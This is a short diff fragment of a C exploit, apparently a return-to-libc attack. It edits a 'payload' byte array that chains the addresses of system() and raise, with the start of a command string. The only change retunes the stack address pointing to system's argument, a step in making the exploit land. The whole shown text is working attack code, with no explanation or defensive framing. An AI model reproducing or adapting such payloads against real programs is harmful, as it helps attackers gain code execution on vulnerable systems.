@@ -25,7 +25,7 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	"\x40\x90\xE9\xB5"	// System Address
 	"\x40\x8D\xE8\xB5"	// Raise Address (return address of System)
-	"\x80\xB6\xFF\xBF"	// Pointer to System's argument (on stack)
+	"\x84\xB6\xFF\xBF"	// Pointer to System's argument (on stack)
 	"\x0C\x00\x00\x00"	// Raise's Argument
 	"\x65\x63\x68\x6F"	// "echo"
 	"\x20\x2D\x6E\x20"	// " -n "
